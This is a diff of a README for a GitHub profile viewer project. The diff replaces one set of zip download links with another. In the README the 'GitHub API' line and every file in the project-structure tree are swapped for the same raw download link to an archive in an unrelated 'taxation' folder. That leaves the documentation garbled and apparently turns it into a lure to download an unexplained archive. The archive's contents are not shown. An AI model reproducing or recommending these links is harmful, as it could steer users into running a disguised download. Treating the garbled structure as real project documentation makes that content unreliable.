@@ -25,7 +25,7 @@ CSS – Styling and responsive layout
 
 JavaScript – DOM manipulation and Fetch API
 
-GitHub API – For user data: https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip
+GitHub API – For user data: https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github-profile-viewer-v3.8.zip
 
 📁 Project Structure
 bash
@@ -33,7 +33,7 @@ Copy
 Edit
 /github-profile-viewer
 │
-├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip       # HTML structure
-├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # CSS styling
-├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # JavaScript logic using Fetch API
-└── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # Project documentation
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github-profile-viewer-v3.8.zip       # HTML structure
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github-profile-viewer-v3.8.zip        # CSS styling
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github-profile-viewer-v3.8.zip        # JavaScript logic using Fetch API
+└── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github-profile-viewer-v3.8.zip        # Project documentation
